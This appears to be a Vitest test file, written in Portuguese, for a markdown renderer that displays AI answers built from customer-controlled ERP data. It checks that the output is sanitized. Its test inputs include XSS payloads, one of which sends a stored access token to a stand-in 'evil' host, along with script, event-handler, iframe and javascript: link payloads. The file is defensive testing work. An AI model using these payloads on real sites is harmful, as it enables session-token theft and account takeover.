// @vitest-environment jsdom
import { describe, it, expect } from 'vitest'
import { renderizarMarkdown } from './markdown'

/*
 * Este arquivo é a prova de que a primeira introdução de HTML dinâmico no
 * projeto não trouxe XSS junto.
 *
 * O caminho de ataque é concreto: `cliente_final` e `descricao_categoria` vêm
 * do ERP da Omie, preenchidos pelo cliente. Uma categoria maliciosa chega à IA,
 * é ecoada na resposta e renderizada no navegador de quem administra dezenas de
 * empresas — com o access_token no localStorage.
 */

describe('markdown: o ataque real', () => {
  /*
   * O payload exato: um cliente nomeia uma categoria na Omie assim, e pergunta
   * alguma que a traga na resposta.
   */
  it('categoria com <img onerror> não vira tag', () => {
    const nomeDeCategoria = '<img src=x onerror="fetch(\'https://evil/\'+localStorage.access_token)">'
    const html = renderizarMarkdown(`A maior despesa foi em ${nomeDeCategoria}.`)

    expect(html).not.toContain('<img')
    expect(html).not.toContain('onerror')
    expect(html).not.toContain('localStorage')
  })

  it('script não sobrevive, em nenhuma das formas', () => {
    const ataques = [
      '<script>alert(1)</script>',
      '<SCRIPT>alert(1)</SCRIPT>',
      '<scr<script>ipt>alert(1)</script>',
      '<img src=x onerror=alert(1)>',
      '<svg onload=alert(1)>',
      '<iframe src="https://evil"></iframe>',
      '<body onload=alert(1)>',
      '<div style="background:url(javascript:alert(1))">x</div>',
    ]

    for (const a of ataques) {
      const html = renderizarMarkdown(a)
      expect(html.toLowerCase()).not.toContain('<script')
      expect(html.toLowerCase()).not.toContain('onerror')
      expect(html.toLowerCase()).not.toContain('onload')
      expect(html.toLowerCase()).not.toContain('<iframe')
      expect(html.toLowerCase()).not.toContain('javascript:')
    }
  })

  // `[clique](javascript:...)` é markdown legítimo que produz link executável.
  it('link com protocolo javascript perde o href', () => {
    const html = renderizarMarkdown('[clique aqui](javascript:alert(document.domain))')

    expect(html.toLowerCase()).not.toContain('javascript:')
    // O texto continua visível; só o link morre.
    expect(html).toContain('clique aqui')
  })

  it('link com data: também perde o href', () => {
    const html = renderizarMarkdown('[x](data:text/html,<script>alert(1)</script>)')
    expect(html.toLowerCase()).not.toContain('data:text/html')
  })

  /*
   * Sem noopener, a página aberta alcança window.opener e pode trocar a aba do
   * VisiON por uma tela de login falsa. O usuário volta, vê o que parece o
   * sistema, e digita a senha.
   */
  it('link externo abre isolado da janela de origem', () => {
    const html = renderizarMarkdown('[Omie](https://app.omie.com.br)')

    expect(html).toContain('href="https://app.omie.com.br"')
    expect(html).toContain('rel="noopener noreferrer"')
    expect(html).toContain('target="_blank"')
  })

  it('nenhum atributo on* sobrevive, em tag permitida', () => {
    const html = renderizarMarkdown('<p onmouseover="alert(1)">passe o mouse</p>')
    expect(html).not.toContain('onmouseover')
    expect(html).toContain('passe o mouse')
  })
})

describe('markdown: o que precisa funcionar', () => {
  it('negrito, que é onde os números importantes aparecem', () => {
    const html = renderizarMarkdown('A receita foi **R$ 6.068.983,00**.')
    expect(html).toMatch(/<strong>R\$ 6\.068\.983,00<\/strong>/)
  })

  it('listas', () => {
    const html = renderizarMarkdown('- Serviços: 62%\n- Produtos: 38%')
    expect(html).toContain('<ul>')
    expect(html).toContain('<li>')
    expect(html).toContain('Serviços')
  })

  it('tabelas — o formato que o financeiro mais pede', () => {
    const html = renderizarMarkdown(
      '| Cliente | Valor |\n|---|---|\n| Alpha | R$ 1.200 |',
    )
    expect(html).toContain('<table>')
    expect(html).toContain('<th>')
    expect(html).toContain('<td>')
    expect(html).toContain('Alpha')
  })

  it('quebra de linha simples vira <br>', () => {
    // O modelo escreve como quem conversa; sem isto as linhas se juntam.
    expect(renderizarMarkdown('primeira\nsegunda')).toContain('<br>')
  })

  it('código inline', () => {
    expect(renderizarMarkdown('use `resumo_financeiro`')).toContain('<code>')
  })

  // Acentuação portuguesa é o conteúdo normal aqui; escapar errado produziria
  // "Servi&ccedil;os" na tela.
  it('acentuação sobrevive intacta', () => {
    const html = renderizarMarkdown('Comissões, manutenção e serviços não previstos.')
    expect(html).toContain('Comissões')
    expect(html).toContain('manutenção')
    expect(html).toContain('serviços')
  })
})

describe('markdown: entradas de borda', () => {
  // Vazio precisa devolver string, não undefined: o Vue renderiza undefined
  // como a palavra "undefined" na bolha.
  it('vazio devolve string vazia', () => {
    expect(renderizarMarkdown('')).toBe('')
    expect(renderizarMarkdown(undefined as unknown as string)).toBe('')
    expect(renderizarMarkdown(null as unknown as string)).toBe('')
  })

  it('texto simples sem marcação funciona', () => {
    expect(renderizarMarkdown('Sem formatação alguma.')).toContain('Sem formatação alguma.')
  })

  // Markdown incompleto acontece quando o modelo é truncado pelo max_tokens.
  it('markdown truncado não quebra', () => {
    expect(() => renderizarMarkdown('**negrito sem fechar e | tabela | pela')).not.toThrow()
  })
})
